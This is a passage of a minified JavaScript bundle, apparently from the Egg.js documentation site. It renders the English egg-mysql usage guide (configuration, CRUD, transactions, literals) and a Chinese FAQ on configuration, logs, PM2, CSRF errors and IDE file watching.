'3307',\n      user: 'test_user',\n      password: 'test_password',\n      database: 'test',\n    },\n    // ...\n  },\n  //default configuration of all databases\n  default: {},\n\n  // load into app, default true\n  app: true,\n  // load into agent, default false\n  agent: false,\n};",lang:"js"}),r.a.createElement("p",null,"Use:"),r.a.createElement(o["a"],{code:"const client1 = app.mysql.get('db1');\nawait client1.query(sql, values);\n\nconst client2 = app.mysql.get('db2');\nawait client2.query(sql, values);",lang:"js"}),r.a.createElement("h4",{id:"dynamic-creation"},r.a.createElement(l["AnchorLink"],{to:"#dynamic-creation","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Dynamic Creation"),r.a.createElement("p",null,"Pre-declaration of configuration might not needed in the configuration file. Obtaining the actual parameters dynamically from the configuration center then initialize an instance instead."),r.a.createElement(o["a"],{code:"// {app_root}/app.js\nmodule.exports = (app) => {\n  app.beforeStart(async () => {\n    // obtain the MySQL configuration from the configuration center\n    // { host: 'mysql.com', port: '3306', user: 'test_user', password: 'test_password', database: 'test' }\n    const mysqlConfig = await app.configCenter.fetch('mysql');\n    app.database = app.mysql.createInstance(mysqlConfig);\n  });\n};",lang:"js"}),r.a.createElement("h2",{id:"service-layer"},r.a.createElement(l["AnchorLink"],{to:"#service-layer","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Service Layer"),r.a.createElement("p",null,"Connecting to MySQL is a data processing layer in the Web layer. So it is strongly recommended that keeping the code in the Service layer."),r.a.createElement("p",null,"An example of connecting to MySQL as follows."),r.a.createElement("p",null,"Details of Service layer, refer to ",r.a.createElement(l["Link"],{to:"../basics/service"},"service")),r.a.createElement(o["a"],{code:"// app/service/user.js\nclass UserService extends Service {\n  async find(uid) {\n    // assume we have the user id then trying to get the user details from database\n    const user = await this.app.mysql.get('users', { id: 11 });\n    return { user };\n  }\n}",lang:"js"}),r.a.createElement("p",null,"After that, obtaining the data from service layer using the controller"),r.a.createElement(o["a"],{code:"// app/controller/user.js\nclass UserController extends Controller {\n  async info() {\n    const ctx = this.ctx;\n    const userId = ctx.params.id;\n    const user = await ctx.service.user.find(userId);\n    ctx.body = user;\n  }\n}",lang:"js"}),r.a.createElement("h2",{id:"writing-crud"},r.a.createElement(l["AnchorLink"],{to:"#writing-crud","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Writing CRUD"),r.a.createElement("p",null,"Following statments default under ",r.a.createElement("code",null,"app/service")," if not specifed"),r.a.createElement("h3",{id:"create"},r.a.createElement(l["AnchorLink"],{to:"#create","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Create"),r.a.createElement("p",null,"INSERT method to perform the INSERT INTO query"),r.a.createElement(o["a"],{code:"// INSERT\nconst result = await this.app.mysql.insert('posts', { title: 'Hello World' }); //insert a record title 'Hello World' to 'posts' table\n\n=> INSERT INTO `posts`(`title`) VALUES('Hello World');\n\nconsole.log(result);\n=>\n{\n  fieldCount: 0,\n  affectedRows: 1,\n  insertId: 3710,\n  serverStatus: 2,\n  warningCount: 2,\n  message: '',\n  protocol41: true,\n  changedRows: 0\n}\n\n// check if insertion is success or failure\nconst insertSuccess = result.affectedRows === 1;",lang:"js"}),r.a.createElement("h3",{id:"read"},r.a.createElement(l["AnchorLink"],{to:"#read","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Read"),r.a.createElement("p",null,"Use ",r.a.createElement("code",null,"get")," or ",r.a.createElement("code",null,"select")," to select one or multiple records. ",r.a.createElement("code",null,"select")," method support query criteria and result customization"),r.a.createElement("ul",null,r.a.createElement("li",null,"get one record")),r.a.createElement(o["a"],{code:"const post = await this.app.mysql.get('posts', { id: 12 });\n\n=> SELECT * FROM `posts` WHERE `id` = 12 LIMIT 0, 1;",lang:"js"}),r.a.createElement("ul",null,r.a.createElement("li",null,"query all from the table")),r.a.createElement(o["a"],{code:"const results = await this.app.mysql.select('posts');\n\n=> SELECT * FROM `posts`;",lang:"js"}),r.a.createElement("ul",null,r.a.createElement("li",null,"query criteria and result customization")),r.a.createElement(o["a"],{code:"const results = await this.app.mysql.select('posts', { // search posts table\n  where: { status: 'draft', author: ['author1', 'author2'] }, // WHERE criteria\n  columns: ['author', 'title'], // get the value of certain columns\n  orders: [['created_at','desc'], ['id','desc']], // sort order\n  limit: 10, // limit the return rows\n  offset: 0, // data offset\n});\n\n=> SELECT `author`, `title` FROM `posts`\n  WHERE `status` = 'draft' AND `author` IN('author1','author2')\n  ORDER BY `created_at` DESC, `id` DESC LIMIT 0, 10;",lang:"js"}),r.a.createElement("h3",{id:"update"},r.a.createElement(l["AnchorLink"],{to:"#update","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Update"),r.a.createElement("p",null,"UPDATE operation to update the records of databases"),r.a.createElement(o["a"],{code:"// modify data and search by primary key ID, and refresh\nconst row = {\n  id: 123,\n  name: 'fengmk2',\n  otherField: 'other field value',    // any other fields u want to update\n  modifiedAt: this.app.mysql.literals.now, // `now()` on db server\n};\nconst result = await this.app.mysql.update('posts', row); // update records in 'posts'\n\n=> UPDATE `posts` SET `name` = 'fengmk2', `modifiedAt` = NOW() WHERE id = 123 ;\n\n// check if update is success or failure\nconst updateSuccess = result.affectedRows === 1;\n\n// if primary key is your custom id,such as custom_id,you should config it in `where`\nconst row = {\n  name: 'fengmk2',\n  otherField: 'other field value',    // any other fields u want to update\n  modifiedAt: this.app.mysql.literals.now, // `now()` on db server\n};\n\nconst options = {\n  where: {\n    custom_id: 456\n  }\n};\nconst result = await this.app.mysql.update('posts', row, options); // update records in 'posts'\n\n=> UPDATE `posts` SET `name` = 'fengmk2', `modifiedAt` = NOW() WHERE custom_id = 456 ;\n\n// check if update is success or failure\nconst updateSuccess = result.affectedRows === 1;",lang:"js"}),r.a.createElement("h3",{id:"delete"},r.a.createElement(l["AnchorLink"],{to:"#delete","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Delete"),r.a.createElement("p",null,"DELETE operation to delete the records of databases"),r.a.createElement(o["a"],{code:"const result = await this.app.mysql.delete('posts', {\n  author: 'fengmk2',\n});\n\n=> DELETE FROM `posts` WHERE `author` = 'fengmk2';",lang:"js"}),r.a.createElement("h2",{id:"implementation-of-sql-statement"},r.a.createElement(l["AnchorLink"],{to:"#implementation-of-sql-statement","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Implementation of SQL statement"),r.a.createElement("p",null,"Plugin supports splicing and execute SQL statment directly. It can use ",r.a.createElement("code",null,"query")," to execute a valid SQL statement"),r.a.createElement("p",null,r.a.createElement("strong",null,"Note!! Strongly do not recommend developers splicing SQL statement, it is easier to cause SQL injection!!")),r.a.createElement("p",null,"Use the ",r.a.createElement("code",null,"mysql.escape")," method if you have to splice SQL statement"),r.a.createElement("p",null,"Refer to ",r.a.createElement(l["Link"],{to:"http://stackoverflow.com/questions/15778572/preventing-sql-injection-in-node-js"},"preventing-sql-injection-in-node-js")),r.a.createElement(o["a"],{code:"const postId = 1;\nconst results = await this.app.mysql.query('update posts set hits = (hits + ?) where id = ?', [1, postId]);\n\n=> update posts set hits = (hits + 1) where id = 1;",lang:"js"}),r.a.createElement("h2",{id:"transaction"},r.a.createElement(l["AnchorLink"],{to:"#transaction","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Transaction"),r.a.createElement("p",null,"Transaction is mainly used to deal with large data of high complexity. For example, in a personnel management system, deleting a person which need to delete the basic information of the staff, but also need to delete the related information of staff, such as mailboxes, articles and so on. It is easier to use transaction to run a set of operations. A transaction is a set of continuous database operations which performed as a single unit of work. Each individual operation within the group is successful and the transaction succeeds. If one part of the transaction fails, then the entire transaction fails. In gerenal, transaction must be atomic, consistent, isolated and durable."),r.a.createElement("ul",null,r.a.createElement("li",null,'Atomicity requires that each transaction be "all or nothing": if one part of the transaction fails, then the entire transaction fails, and the database state is left unchanged.'),r.a.createElement("li",null,"The consistency property ensures that any transaction will bring the database from one valid state to another."),r.a.createElement("li",null,"The isolation property ensures that the concurrent execution of transactions results in a system state that would be obtained if transactions were executed sequentially"),r.a.createElement("li",null,"The durability property ensures that once a transaction has been committed, it will remain so.")),r.a.createElement("p",null,"Therefore, for a transaction, must be accompanied by beginTransaction, commit or rollback, respectively, beginning of the transaction, success and failure to roll back."),r.a.createElement("p",null,"egg-mysql proviodes two types of transactions"),r.a.createElement("h3",{id:"manual-control"},r.a.createElement(l["AnchorLink"],{to:"#manual-control","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Manual Control"),r.a.createElement("ul",null,r.a.createElement("li",null,"adventage: ",r.a.createElement("code",null,"beginTransaction"),", ",r.a.createElement("code",null,"commit")," or ",r.a.createElement("code",null,"rollback")," can be completely under control by developer"),r.a.createElement("li",null,"disadventage: more handwritten code, Forgot catching error or cleanup will lead to serious bug.")),r.a.createElement(o["a"],{code:"const conn = await app.mysql.beginTransaction(); // initialize the transaction\n\ntry {\n  await conn.insert(table, row1); // first step\n  await conn.update(table, row2); // second step\n  await conn.commit(); // commit the transaction\n} catch (err) {\n  // error, rollback\n  await conn.rollback(); // rollback after catching the exception!!\n  throw err;\n}",lang:"js"}),r.a.createElement("h3",{id:"automatic-control-transaction-with-scope"},r.a.createElement(l["AnchorLink"],{to:"#automatic-control-transaction-with-scope","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Automatic Control: Transaction with Scope"),r.a.createElement("ul",null,r.a.createElement("li",null,"API\uff1a",r.a.createElement("code",null,"beginTransactionScope(scope, ctx)"),r.a.createElement("ul",null,r.a.createElement("li",null,r.a.createElement("code",null,"scope"),": A generatorFunction which will execute all sqls of this transaction."),r.a.createElement("li",null,r.a.createElement("code",null,"ctx"),": The context object of current request, it will ensures that even in the case of a nested transaction, there is only one active transaction in a request at the same time."))),r.a.createElement("li",null,"adventage: easy to use, as if there is no transaction in your code."),r.a.createElement("li",null,"disadvantage: all transation will be successful or failed, cannot control precisely")),r.a.createElement(o["a"],{code:"const result = await app.mysql.beginTransactionScope(async (conn) => {\n  // don't commit or rollback by yourself\n  await conn.insert(table, row1);\n  await conn.update(table, row2);\n  return { success: true };\n}, ctx); // ctx is the context of current request, accessed by `this.ctx`  within in service file.\n// if error throw on scope, will auto rollback",lang:"js"}),r.a.createElement("h2",{id:"literal"},r.a.createElement(l["AnchorLink"],{to:"#literal","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Literal"),r.a.createElement("p",null,"Use ",r.a.createElement("code",null,"Literal")," if need to call literals or functions in MySQL"),r.a.createElement("h3",{id:"inner-literal"},r.a.createElement(l["AnchorLink"],{to:"#inner-literal","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Inner Literal"),r.a.createElement("ul",null,r.a.createElement("li",null,r.a.createElement("code",null,"NOW()"),"\uff1aThe database system time, obtained by ",r.a.createElement("code",null,"app.mysql.literals.now"))),r.a.createElement(o["a"],{code:"await this.app.mysql.insert(table, {\n  create_time: this.app.mysql.literals.now,\n});\n\n=> INSERT INTO `$table`(`create_time`) VALUES(NOW())",lang:"js"}),r.a.createElement("h3",{id:"custom-literal"},r.a.createElement(l["AnchorLink"],{to:"#custom-literal","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Custom literal"),r.a.createElement("p",null,"The following demo showe how to call ",r.a.createElement("code",null,"CONCAT(s1, ...sn)")," funtion in mysql to do string splicing."),r.a.createElement(o["a"],{code:'const Literal = this.app.mysql.literals.Literal;\nconst first = \'James\';\nconst last = \'Bond\';\nawait this.app.mysql.insert(table, {\n  id: 123,\n  fullname: new Literal(`CONCAT("${first}", "${last}"`),\n});\n\n=> INSERT INTO `$table`(`id`, `fullname`) VALUES(123, CONCAT("James", "Bond"))',lang:"js"})))}));t["default"]=e=>{var t=r.a.useContext(l["context"]),n=t.demos;return r.a.useEffect((()=>{var t;null!==e&&void 0!==e&&null!==(t=e.location)&&void 0!==t&&t.hash&&l["AnchorLink"].scrollToAnchor(decodeURIComponent(e.location.hash.slice(1)))}),[]),r.a.createElement(i,{demos:n})}},OJ6K:function(e,t,n){var a=n("0mt+");a({target:"Math",stat:!0},{iaddh:function(e,t,n,a){var r=e>>>0,l=t>>>0,o=n>>>0;return l+(a>>>0)+((r&o|(r|o)&~(r+o>>>0))>>>31)|0}})},ONYO:function(e,t,n){"use strict";n.r(t);var a=n("FU0I"),r=n.n(a),l=n("j00X"),o=n("P/fr"),i=r.a.memo((e=>{e.demos;return r.a.createElement(r.a.Fragment,null,r.a.createElement("div",{className:"markdown"},r.a.createElement("p",null,"\u5982\u679c\u4e0b\u9762\u7684\u5185\u5bb9\u65e0\u6cd5\u89e3\u51b3\u4f60\u7684\u95ee\u9898\uff0c\u8bf7\u67e5\u770b ",r.a.createElement(l["Link"],{to:"https://github.com/eggjs/egg/issues"},"Egg issues"),"\u3002"),r.a.createElement("h2",{id:"\u5982\u4f55\u9ad8\u6548\u5730\u53cd\u9988\u95ee\u9898"},r.a.createElement(l["AnchorLink"],{to:"#\u5982\u4f55\u9ad8\u6548\u5730\u53cd\u9988\u95ee\u9898","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u5982\u4f55\u9ad8\u6548\u5730\u53cd\u9988\u95ee\u9898\uff1f"),r.a.createElement("p",null,"\u611f\u8c22\u60a8\u5411\u6211\u4eec\u53cd\u9988\u95ee\u9898\u3002"),r.a.createElement("ol",null,r.a.createElement("li",null,"\u6211\u4eec\u63a8\u8350\u5982\u679c\u662f\u5c0f\u95ee\u9898\uff08\u9519\u522b\u5b57\u4fee\u6539\uff0c\u5c0f\u7684 bug fix\uff09\u76f4\u63a5\u63d0\u4ea4 PR\u3002"),r.a.createElement("li",null,"\u5982\u679c\u662f\u4e00\u4e2a\u65b0\u9700\u6c42\uff0c\u8bf7\u63d0\u4f9b\uff1a\u8be6\u7ec6\u9700\u6c42\u63cf\u8ff0\uff0c\u6700\u597d\u662f\u6709\u4f2a\u4ee3\u7801\u793a\u610f\u3002"),r.a.createElement("li",null,"\u5982\u679c\u662f\u4e00\u4e2a BUG\uff0c\u8bf7\u63d0\u4f9b\uff1a\u590d\u73b0\u6b65\u9aa4\uff0c\u9519\u8bef\u65e5\u5fd7\u4ee5\u53ca\u76f8\u5173\u914d\u7f6e\uff0c\u5e76\u5c3d\u91cf\u586b\u5199\u4e0b\u9762\u7684\u6a21\u677f\u4e2d\u7684\u6761\u76ee\u3002"),r.a.createElement("li",null,r.a.createElement("strong",null,"\u5982\u679c\u53ef\u4ee5\uff0c\u5c3d\u53ef\u80fd\u4f7f\u7528 ",r.a.createElement("code",null,"npm init egg --type=simple bug")," \u63d0\u4f9b\u4e00\u4e2a\u6700\u5c0f\u53ef\u590d\u73b0\u7684\u4ee3\u7801\u4ed3\u5e93\uff0c\u65b9\u4fbf\u6211\u4eec\u6392\u67e5\u95ee\u9898\u3002")),r.a.createElement("li",null,"\u4e0d\u8981\u6324\u7259\u818f\u4f3c\u7684\u4ea4\u6d41\uff0c\u6269\u5c55\u9605\u8bfb\uff1a",r.a.createElement(l["Link"],{to:"https://zhuanlan.zhihu.com/p/25795393"},"\u5982\u4f55\u5411\u5f00\u6e90\u9879\u76ee\u63d0\u4ea4\u65e0\u6cd5\u89e3\u7b54\u7684\u95ee\u9898"))),r.a.createElement("p",null,"\u6700\u91cd\u8981\u7684\u662f\uff0c\u8bf7\u660e\u767d\u4e00\u4ef6\u4e8b\uff1a\u5f00\u6e90\u9879\u76ee\u7684\u7528\u6237\u548c\u7ef4\u62a4\u8005\u4e4b\u95f4\u5e76\u4e0d\u662f\u7532\u65b9\u548c\u4e59\u65b9\u7684\u5173\u7cfb\uff0cissue \u4e5f\u4e0d\u662f\u5ba2\u670d\u5de5\u5355\u3002\u5728\u5f00 issue \u7684\u65f6\u5019\uff0c\u8bf7\u62b1\u7740\u4e00\u79cd\u300e\u4e00\u8d77\u5408\u4f5c\u6765\u89e3\u51b3\u8fd9\u4e2a\u95ee\u9898\u300f\u7684\u5fc3\u6001\uff0c\u4e0d\u8981\u671f\u5f85\u6211\u4eec\u5355\u65b9\u9762\u5730\u4e3a\u4f60\u670d\u52a1\u3002"),r.a.createElement("h2",{id:"\u4e3a\u4ec0\u4e48\u6211\u7684\u914d\u7f6e\u4e0d\u751f\u6548"},r.a.createElement(l["AnchorLink"],{to:"#\u4e3a\u4ec0\u4e48\u6211\u7684\u914d\u7f6e\u4e0d\u751f\u6548","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u4e3a\u4ec0\u4e48\u6211\u7684\u914d\u7f6e\u4e0d\u751f\u6548\uff1f"),r.a.createElement("p",null,"\u6846\u67b6\u7684\u914d\u7f6e\u529f\u80fd\u6bd4\u8f83\u5f3a\u5927\uff0c\u6709\u4e0d\u540c\u73af\u5883\u53d8\u91cf\uff0c\u53c8\u6709\u6846\u67b6\u3001\u63d2\u4ef6\u3001\u5e94\u7528\u7b49\u5f88\u591a\u5730\u65b9\u914d\u7f6e\u3002"),r.a.createElement("p",null,"\u5982\u679c\u4f60\u5206\u6790\u95ee\u9898\u65f6\uff0c\u60f3\u77e5\u9053\u5f53\u524d\u8fd0\u884c\u65f6\u4f7f\u7528\u7684\u6700\u7ec8\u914d\u7f6e\uff0c\u53ef\u4ee5\u67e5\u770b\u4e0b ",r.a.createElement("code",null,"$","{","root","}","/run/application_config.json"),"\uff08worker \u8fdb\u7a0b\u914d\u7f6e\uff09 \u548c ",r.a.createElement("code",null,"$","{","root","}","/run/agent_config.json"),"\uff08agent \u8fdb\u7a0b\u914d\u7f6e\uff09 \u8fd9\u4e24\u4e2a\u6587\u4ef6\u3002\uff08",r.a.createElement("code",null,"root")," \u4e3a\u5e94\u7528\u6839\u76ee\u5f55\uff0c\u53ea\u6709\u5728 local \u548c unittest \u73af\u5883\u4e0b\u4e3a\u9879\u76ee\u6240\u5728\u76ee\u5f55\uff0c\u5176\u4ed6\u73af\u5883\u4e0b\u90fd\u4e3a HOME \u76ee\u5f55\uff09"),r.a.createElement("p",null,"\u4e5f\u53ef\u53c2\u89c1",r.a.createElement(l["AnchorLink"],{to:"../basics/config#%E9%85%8D%E7%BD%AE%E7%BB%93%E6%9E%9C"},"\u914d\u7f6e\u6587\u4ef6"),"\u3002"),r.a.createElement("p",null,"PS\uff1a\u8bf7\u786e\u4fdd\u6ca1\u6709\u5199\u51fa\u4ee5\u4e0b\u4ee3\u7801\uff1a"),r.a.createElement(o["a"],{code:"// config/config.default.js\nexports.someKeys = 'abc';\nmodule.exports = (appInfo) => {\n  const config = {};\n  config.keys = '123456';\n  return config;\n};",lang:"js"}),r.a.createElement("h2",{id:"\u7ebf\u4e0a\u7684\u65e5\u5fd7\u6253\u5370\u53bb\u54ea\u91cc\u4e86"},r.a.createElement(l["AnchorLink"],{to:"#\u7ebf\u4e0a\u7684\u65e5\u5fd7\u6253\u5370\u53bb\u54ea\u91cc\u4e86","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u7ebf\u4e0a\u7684\u65e5\u5fd7\u6253\u5370\u53bb\u54ea\u91cc\u4e86\uff1f"),r.a.createElement("p",null,"\u9ed8\u8ba4\u914d\u7f6e\u4e0b\uff0c\u672c\u5730\u5f00\u53d1\u73af\u5883\u7684\u65e5\u5fd7\u90fd\u4f1a\u6253\u5370\u5728\u5e94\u7528\u6839\u76ee\u5f55\u7684 ",r.a.createElement("code",null,"logs")," \u6587\u4ef6\u5939\u4e0b(",r.a.createElement("code",null,"$","{","baseDir","}","/logs"),") \uff0c\u4f46\u662f\u5728\u975e\u5f00\u53d1\u671f\u7684\u73af\u5883\uff08\u975e local \u548c unittest \u73af\u5883\uff09\uff0c\u6240\u6709\u7684\u65e5\u5fd7\u90fd\u4f1a\u6253\u5370\u5230 ",r.a.createElement("code",null,"$HOME/logs")," \u6587\u4ef6\u5939\u4e0b\uff08\u4f8b\u5982 ",r.a.createElement("code",null,"/home/admin/logs"),"\uff09\u3002\u8fd9\u6837\u53ef\u4ee5\u8ba9\u672c\u5730\u5f00\u53d1\u65f6\u5e94\u7528\u65e5\u5fd7\u4e92\u4e0d\u5f71\u54cd\uff0c\u670d\u52a1\u5668\u8fd0\u884c\u65f6\u53c8\u6709\u7edf\u4e00\u7684\u65e5\u5fd7\u8f93\u51fa\u76ee\u5f55\u3002"),r.a.createElement("h2",{id:"\u8fdb\u7a0b\u7ba1\u7406\u4e3a\u4ec0\u4e48\u6ca1\u6709\u9009\u578b-pm2-"},r.a.createElement(l["AnchorLink"],{to:"#\u8fdb\u7a0b\u7ba1\u7406\u4e3a\u4ec0\u4e48\u6ca1\u6709\u9009\u578b-pm2-","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u8fdb\u7a0b\u7ba1\u7406\u4e3a\u4ec0\u4e48\u6ca1\u6709\u9009\u578b PM2 \uff1f"),r.a.createElement("ol",null,r.a.createElement("li",null,"PM2 \u6a21\u5757\u672c\u8eab\u590d\u6742\u5ea6\u5f88\u9ad8\uff0c\u51fa\u4e86\u95ee\u9898\u5f88\u96be\u6392\u67e5\u3002\u6211\u4eec\u8ba4\u4e3a\u6846\u67b6\u4f7f\u7528\u7684\u5de5\u5177\u590d\u6742\u5ea6\u4e0d\u5e94\u8be5\u8fc7\u9ad8\uff0c\u800c PM2 \u81ea\u8eab\u7684\u590d\u6742\u5ea6\u8d85\u8d8a\u4e86\u5927\u90e8\u5206\u5e94\u7528\u672c\u8eab\u3002"),r.a.createElement("li",null,"\u6ca1\u6cd5\u505a\u975e\u5e38\u6df1\u7684\u4f18\u5316\u3002"),r.a.createElement("li",null,"\u5207\u5b9e\u7684\u9700\u6c42\u95ee\u9898\uff0c\u4e00\u4e2a\u8fdb\u7a0b\u91cc\u8dd1 leader\uff0c\u5176\u4ed6\u8fdb\u7a0b\u4ee3\u7406\u5230 leader \u8fd9\u79cd\u6a21\u5f0f\uff08",r.a.createElement(l["Link"],{to:"../core/cluster-and-ipc"},"\u591a\u8fdb\u7a0b\u6a21\u578b"),"\uff09\uff0c\u5728\u4f01\u4e1a\u7ea7\u5f00\u53d1\u4e2d\u5bf9\u4e8e\u51cf\u5c11\u8fdc\u7aef\u8fde\u63a5\uff0c\u964d\u4f4e\u6570\u636e\u901a\u4fe1\u538b\u529b\u7b49\u90fd\u662f\u5207\u5b9e\u7684\u9700\u6c42\u3002\u7279\u522b\u5f53\u5e94\u7528\u89c4\u6a21\u5927\u5230\u4e00\u5b9a\u7a0b\u5ea6\uff0c\u8fd9\u5c31\u4f1a\u662f\u521a\u9700\u3002egg \u672c\u8eab\u8d77\u6e90\u4e8e\u8682\u8681\u91d1\u670d\u548c\u963f\u91cc\uff0c\u6211\u4eec\u5bf9\u6807\u7684\u8d77\u70b9\u5c31\u662f\u5927\u89c4\u6a21\u4f01\u4e1a\u5e94\u7528\u7684\u6784\u5efa\uff0c\u6240\u4ee5\u8981\u975e\u5e38\u5168\u9762\u3002\u8fd9\u4e9b\u7279\u6027\u901a\u8fc7 PM2 \u5f88\u96be\u505a\u5230\u3002")),r.a.createElement("p",null,"\u8fdb\u7a0b\u6a21\u578b\u975e\u5e38\u91cd\u8981\uff0c\u4f1a\u5f71\u54cd\u5230\u5f00\u53d1\u6a21\u5f0f\uff0c\u8fd0\u884c\u671f\u95f4\u7684\u6df1\u5ea6\u4f18\u5316\u7b49\uff0c\u6211\u4eec\u8ba4\u4e3a\u53ef\u80fd\u7531\u6846\u67b6\u6765\u63a7\u5236\u6bd4\u8f83\u5408\u9002\u3002"),r.a.createElement("p",null,r.a.createElement("strong",null,"\u5982\u4f55\u4f7f\u7528 PM2 \u542f\u52a8\u5e94\u7528\uff1f")),r.a.createElement("p",null,"\u5c3d\u7ba1\u6211\u4eec\u4e0d\u63a8\u8350\u4f7f\u7528 PM2 \u542f\u52a8\uff0c\u4f46\u4ecd\u7136\u662f\u53ef\u4ee5\u505a\u5230\u7684\u3002"),r.a.createElement("p",null,"\u9996\u5148\uff0c\u5728\u9879\u76ee\u6839\u76ee\u5f55\u5b9a\u4e49\u542f\u52a8\u6587\u4ef6\uff1a"),r.a.createElement(o["a"],{code:"// server.js\nconst egg = require('egg');\n\nconst workers = Number(process.argv[2] || require('os').cpus().length);\negg.startCluster({\n  workers,\n  baseDir: __dirname,\n});",lang:"js"}),r.a.createElement("p",null,"\u8fd9\u6837\uff0c\u6211\u4eec\u5c31\u53ef\u4ee5\u901a\u8fc7 PM2 \u8fdb\u884c\u542f\u52a8\u4e86\uff1a"),r.a.createElement(o["a"],{code:"pm2 start server.js",lang:"bash"}),r.a.createElement("h2",{id:"\u4e3a\u4ec0\u4e48\u4f1a\u6709-csrf-\u62a5\u9519"},r.a.createElement(l["AnchorLink"],{to:"#\u4e3a\u4ec0\u4e48\u4f1a\u6709-csrf-\u62a5\u9519","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u4e3a\u4ec0\u4e48\u4f1a\u6709 csrf \u62a5\u9519\uff1f"),r.a.createElement("p",null,"\u901a\u5e38\u6709\u4e24\u79cd csrf \u62a5\u9519\uff1a"),r.a.createElement("ul",null,r.a.createElement("li",null,r.a.createElement("code",null,"missing csrf token")),r.a.createElement("li",null,r.a.createElement("code",null,"invalid csrf token"))),r.a.createElement("p",null,"Egg \u5185\u7f6e\u7684 ",r.a.createElement(l["Link"],{to:"https://github.com/eggjs/egg-security/"},"egg-security")," \u63d2\u4ef6\u9ed8\u8ba4\u5bf9\u6240\u6709\u300e\u975e\u5b89\u5168\u300f\u7684\u65b9\u6cd5\uff0c\u4f8b\u5982 ",r.a.createElement("code",null,"POST"),"\uff0c",r.a.createElement("code",null,"PUT"),"\uff0c",r.a.createElement("code",null,"DELETE")," \u90fd\u8fdb\u884c CSRF \u6821\u9a8c\u3002"),r.a.createElement("p",null,"\u8bf7\u6c42\u9047\u5230 csrf \u62a5\u9519\u901a\u5e38\u662f\u56e0\u4e3a\u6ca1\u6709\u52a0\u6b63\u786e\u7684 csrf token \u5bfc\u81f4\uff0c\u5177\u4f53\u5b9e\u73b0\u65b9\u5f0f\uff0c\u8bf7\u9605\u8bfb",r.a.createElement(l["AnchorLink"],{to:"../core/security#%E5%AE%89%E5%85%A8%E5%A8%81%E8%83%81csrf%E7%9A%84%E9%98%B2%E8%8C%83"},"\u5b89\u5168\u5a01\u80c1 CSRF \u7684\u9632\u8303"),"\u3002"),r.a.createElement("h2",{id:"\u672c\u5730\u5f00\u53d1\u65f6\u4fee\u6539\u4ee3\u7801\u540e\u4e3a\u4ec0\u4e48-worker-\u8fdb\u7a0b\u6ca1\u6709\u81ea\u52a8\u91cd\u542f"},r.a.createElement(l["AnchorLink"],{to:"#\u672c\u5730\u5f00\u53d1\u65f6\u4fee\u6539\u4ee3\u7801\u540e\u4e3a\u4ec0\u4e48-worker-\u8fdb\u7a0b\u6ca1\u6709\u81ea\u52a8\u91cd\u542f","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u672c\u5730\u5f00\u53d1\u65f6\uff0c\u4fee\u6539\u4ee3\u7801\u540e\u4e3a\u4ec0\u4e48 worker \u8fdb\u7a0b\u6ca1\u6709\u81ea\u52a8\u91cd\u542f\uff1f"),r.a.createElement("p",null,"\u6ca1\u6709\u81ea\u52a8\u91cd\u542f\u7684\u60c5\u51b5\u4e00\u822c\u662f\u5728\u4f7f\u7528 Jetbrains \u65d7\u4e0b\u8f6f\u4ef6\uff08IntelliJ IDEA, WebStorm..\uff09\uff0c\u5e76\u4e14\u5f00\u542f\u4e86 Safe Write \u9009\u9879\u3002"),r.a.createElement("p",null,"Jetbrains ",r.a.createElement(l["Link"],{to:"https://www.jetbrains.com/help/webstorm/2016.3/system-settings.html"},"Safe Write \u6587\u6863"),"\u4e2d\u6709\u63d0\u5230\uff08\u7ffb\u8bd1\u5982\u4e0b\uff09\uff1a"),r.a.createElement("blockquote",null,r.a.createElement("p",null,"\u5982\u679c\u6b64\u590d\u9009\u6846\u6253\u94a9\uff0c\u53d8\u66f4\u7684\u6587\u4ef6\u5c06\u9996\u5148\u88ab\u5b58\u50a8\u5728\u4e00\u4e2a\u4e34\u65f6\u6587\u4ef6\u4e2d\u3002\u5982\u679c\u6210\u529f\u4fdd\u5b58\u4e86\u8be5\u6587\u4ef6\uff0c\u90a3\u4e48\u5c31\u4f1a\u88ab\u8fd9\u4e2a\u6587\u4ef6\u6240\u53d6\u4ee3\uff08\u4ece\u6280\u672f\u4e0a\u6765\u8bf4\uff0c\u539f\u6587\u4ef6\u88ab\u5220\u9664\uff0c\u4e34\u65f6\u6587\u4ef6\u88ab\u91cd\u547d\u540d\uff09\u3002")),r.a.createElement("p",null,'\u7531\u4e8e\u4f7f\u7528\u4e86\u91cd\u547d\u540d\u5bfc\u81f4\u6587\u4ef6\u76d1\u542c\u7684\u5931\u6548\u3002\u89e3\u51b3\u529e\u6cd5\u662f\u5173\u6389 Safe Write \u9009\u9879\u3002\uff08Settings | Appearance & Behavior | System Settings | Use "safe write" \u8def\u5f84\u53ef\u80fd\u6839\u636e\u7248\u672c\u6709\u6240\u4e0d\u540c\uff09')))}));t["default"]=e=>{var t=r.a.useContext(l["context"]),n=t.demos;return r.a.useEffect((()=>{var t;null!==e&&void 0!==e&&null!==(t=e.location)&&void 